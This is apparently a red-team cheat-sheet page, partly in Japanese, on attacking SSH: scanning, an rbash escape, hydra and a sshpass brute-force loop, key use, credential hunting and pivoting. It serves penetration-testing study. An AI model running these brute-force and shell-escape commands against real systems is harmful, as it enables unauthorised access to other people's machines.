---
title: 22 SSH
parent: Services
grand_parent: Red Team
nav_order: 22
---
# SSH
## Secure Shell
---

## Default Port

- 22

---

## Service Info

SSH (Secure Shell) is a secure remote administration protocol used for encrypted command execution and file transfer.

It is commonly used for:
- remote system administration
- lateral movement in internal networks
- secure file transfer (SCP/SFTP)
- credential-based access to Linux systems

SSH is typically exposed after initial compromise or misconfiguration and is a primary target for credential reuse attacks.

---

## Common security issues

- Weak or reused credentials
- Private key leakage (id_rsa exposure)
- Password authentication enabled
- Outdated SSH versions with known vulnerabilities
- Misconfigured authorized_keys (key injection)
- User enumeration via response timing differences
- Key reuse across multiple systems
- Exposed backup or configuration files containing SSH keys

---
# Login

#### パスワード認証

```bash
ssh test@192.168.0.1
# パスワードを入力
```

#### ログイン時にrbash（制限付きシェル）を回避する方法

```bash
ssh seppuku@192.168.0.115 -t "bash --noprofile"
```

#### サーバの暗号アルゴリズムに合わせる

```bash
ssh -c <cipher_algorithm> username@hostname
```
---
# Initial Scan

## Banner Check

```zsh
ssh 192.168.45.101
```

👉 Check:

- Banner Message (Example Knock Port)
## Script Scan
```bash
nmap -p 22 --script ssh-hostkey,ssh-auth-methods <IP>
```

👉 Check:

* SSH version
* Supported authentication methods
* Host key info

---

# Enumeration

```bash
ssh -v user@<IP>
```

### brute-force
#### hydra

```zsh
hydra -l geisha -P /usr/share/wordlists/rockyou.txt ssh://geisha
```
- **-l**: an user
- **-P**: password file

#### shell script
```bash
for password in $(cat /path/to/passwordlist.txt); do
    echo "Trying password: $password"
    sshpass -p "$password" ssh -o StrictHostKeyChecking=no user@ssh.example.com exit
    if [ $? -eq 0 ]; then
        echo "Password found: $password"
        break
    fi
done
```
- /path/to/passwordlist.txt # Password list
- **sshpass**: A tool that automatically provides passwords.
- **-o StrictHostKeyChecking=no**: Disables host key verification.

#### Collecting server public keys
##### `ssh-keyscan` tool
A tool for collecting public keys from SSH servers. It helps verify server keys.

Collect public keys from an SSH server
```bash
ssh-keyscan ssh.example.com
```
- **ssh-keyscan**: Retrieves public keys from an SSH server.

##### `ssh-keygen` Tool
A tool for generating SSH key pairs.  
Used for configuring public key authentication.

Generate a new SSH key pair
```bash
ssh-keygen -t rsa -b 2048 -f ~/.ssh/id_rsa
```
- **-t rsa**: Specifies that an RSA key should be generated.
- **-b 2048**: Specifies the key's bit length.
- **-f**: Specifies the output destination for the key file.


👉 Check:

* Valid username behavior
* Authentication error differences
* Banner disclosure

---

## 3. Access / Login

### Password Authentication

```bash
ssh user@<IP>
```

---

### Private Key Authentication

```bash
chmod 600 id_rsa
```

```zsh
ssh -i id_rsa user@<IP>
```

---

## 4. Credential Hunting

👉 Common sources:

* Web application leaks
* Backup files
* SMB shares
* Git repositories

👉 If creds found → try:

* [WinRM](5985,5986_winrm.md)
* [SMB](139,445_smb.md)
* [MSSQL](1433_mssql.md)

---

## 5. No Credentials?

👉 Try:

* Username enumeration
* Password reuse from other services
* Key leakage in exposed files

---

## 6. Lateral Movement  / Pivot 

👉 Reuse access:

* SSH keys across hosts
* Internal pivot via tunneling
* Credential reuse in SMB / WinRM
* [ligolo](../06_pivot_tunneling/ligolo.md)
- [chisel](../06_pivot_tunneling/chisel.md)
- [ssh-tunnel](../06_pivot_tunneling/ssh_tunnel.md)

---

## 7.Privilege Escalation

- [Linux](../07_linux_priv/linux.md)
- [Windows](../08_windows_priv/windows.md)

